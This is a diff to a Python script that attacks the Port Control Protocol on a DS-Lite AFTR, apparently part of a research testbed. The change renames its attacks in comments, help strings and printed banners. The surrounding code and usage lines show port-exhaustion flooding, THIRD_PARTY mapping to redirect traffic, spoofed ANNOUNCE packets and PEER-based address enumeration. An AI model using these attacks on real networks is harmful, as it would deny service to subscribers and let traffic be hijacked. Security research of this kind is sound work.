@@ -1,7 +1,7 @@
 #!/usr/bin/python
-# TS2 – PCP Port Exhaustion DoS
+# PCP Port Exhaustion (auxiliary; generic CGNAT weakness, not a paper corpus attack)
 # T8 – Unauthorized THIRD_PARTY Forwarding
-# TS3 – PCP ANNOUNCE Spoofing (epoch reset attack)
+# PCP ANNOUNCE Spoofing (auxiliary; epoch-reset, not a paper corpus attack)
 # T9 – PCP PEER Abuse (external address enumeration)
 #
 # PCP (Port Control Protocol, RFC 6887) manages port mappings on the AFTR.
@@ -20,13 +20,13 @@
 #
 # Without authentication (RFC 7652), PCP is vulnerable to:
 #
-#   TS2 (exhaust): Flood MAP requests to allocate all available ports (32768-65534)
+#   exhaust: Flood MAP requests to allocate all available ports (32768-65534)
 #                  → legitimate subscribers cannot get port mappings
 #
 #   T8 (third-party): Create mappings using THIRD_PARTY option for arbitrary
 #                  internal IPs → redirect internet traffic to any internal host
 #
-#   TS3 (announce): Spoof unsolicited ANNOUNCE on ISP path (or LAN) to trick
+#   announce: Spoof unsolicited ANNOUNCE on ISP path (or LAN) to trick
 #                  PCP clients into believing the AFTR has restarted → all
 #                  clients re-establish mappings, creating DoS or theft window
 #
@@ -34,8 +34,8 @@
 #               other subscribers → information disclosure for further attacks
 #
 # Attacker positions:
-#   TS2/T8/T9: B4 LAN (10.0.x.150) → send to B4 PCP proxy (10.0.x.1:5351)
-#   TS3:         ISP network (eth-isp) → inject IPv6 PCP
+#   exhaust/T8/T9: B4 LAN (10.0.x.150) → send to B4 PCP proxy (10.0.x.1:5351)
+#   announce:     ISP network (eth-isp) → inject IPv6 PCP
 #
 # Usage:
 #   python3 pcp_attack.py exhaust --proxy-ip 10.0.1.1 --count 5000 --threads 4
@@ -193,7 +193,7 @@ def send_pcp_request(proxy_ip, pkt, timeout=3):
     bypassed — so its THIRD_PARTY-stripping defence (b4/pcp_proxy.py) no
     longer applies and the attacker's own THIRD_PARTY option reaches the
     AFTR PCP server verbatim. This is the realistic ISP-side attack path
-    for TS2/T8/T9.
+    for exhaust/T8/T9.
     """
     is_v6 = ":" in proxy_ip
     fam = socket.AF_INET6 if is_v6 else socket.AF_INET
@@ -214,7 +214,7 @@ def send_pcp_request(proxy_ip, pkt, timeout=3):
         s.close()
 
 
-# ── TS2: PORT EXHAUSTION ──────────────────────────────────────────────────
+# ── PORT EXHAUSTION (auxiliary) ──────────────────────────────────────────────────
 
 def worker_exhaust(proxy_ip, proto, count, third_party_prefix=None, idx=0,
                    fire_and_forget=False):
@@ -283,8 +283,8 @@ def worker_exhaust(proxy_ip, proto, count, third_party_prefix=None, idx=0,
 
 
 def run_exhaust(args):
-    """TS2: Flood PCP MAP requests to exhaust port pool."""
-    print(f"[*] TS2 – PCP Port Exhaustion DoS")
+    """Flood PCP MAP requests to exhaust port pool (auxiliary)."""
+    print(f"[*] PCP Port Exhaustion (auxiliary)")
     print(f"[*] Target PCP proxy: {args.proxy_ip}:{PCP_PORT}")
     print(f"[*] Sending {args.count} MAP requests via {args.threads} threads")
     print(f"[*] Protocol: {'TCP' if args.proto == 6 else 'UDP'}")
@@ -401,11 +401,11 @@ def run_third_party(args):
     return len(created) > 0
 
 
-# ── TS3: ANNOUNCE SPOOFING ────────────────────────────────────────────────
+# ── ANNOUNCE SPOOFING (auxiliary) ────────────────────────────────────────────────
 
 def run_announce_spoof(args):
     """
-    TS3: Spoof PCP ANNOUNCE on ISP segment to force mapping re-establishment.
+    Spoof PCP ANNOUNCE on ISP segment to force mapping re-establishment.
 
     RFC 6887 §14.1: When a PCP server restarts with lost state, it sends an
     unsolicited ANNOUNCE with a new epoch value.  All PCP clients that see
@@ -422,7 +422,7 @@ def run_announce_spoof(args):
     from scapy.layers.l2 import Ether
     from scapy.sendrecv import sendp
 
-    print(f"[*] TS3 – PCP ANNOUNCE Spoofing (epoch reset attack)")
+    print(f"[*] PCP ANNOUNCE Spoofing (auxiliary)")
     print(f"[*] Interface: {args.interface}")
     print(f"[*] Spoofing AFTR address: {args.aftr_ip6}")
     print()
@@ -695,15 +695,15 @@ def run_map(args):
 
 def main():
     p = argparse.ArgumentParser(
-        description="TS2/T8/TS3 (+ T9 peer) – PCP Security Attacks\n"
+        description="PCP Security: T8/T9 (+ auxiliary exhaust/announce)\n"
                     "Targets the PCP Port Control Protocol (RFC 6887) in DS-Lite.\n"
                     "RFC 6887 opcodes: MAP(1), PEER(2), ANNOUNCE(0)",
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
     sub = p.add_subparsers(dest='mode', required=True)
 
-    # TS2
-    e = sub.add_parser('exhaust', help='TS2: Flood MAP requests to exhaust PCP port pool')
+    # exhaust
+    e = sub.add_parser('exhaust', help='Flood MAP requests to exhaust PCP port pool (auxiliary)')
     e.add_argument('--proxy-ip', default='10.0.1.1',
                    help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
     e.add_argument('--count', type=int, default=30000,
@@ -733,9 +733,9 @@ def main():
     tp.add_argument('--proto', type=int, default=6, choices=[6, 17],
                     help='IP protocol (default: 6 TCP)')
 
-    # TS3
+    # announce
     an = sub.add_parser('announce',
-                        help='TS3: Spoof PCP ANNOUNCE to force mapping re-establishment')
+                        help='Spoof PCP ANNOUNCE to force mapping re-establishment (auxiliary)')
     an.add_argument('--interface', required=True,
                     help='ISP network interface (e.g. eth-isp)')
     an.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
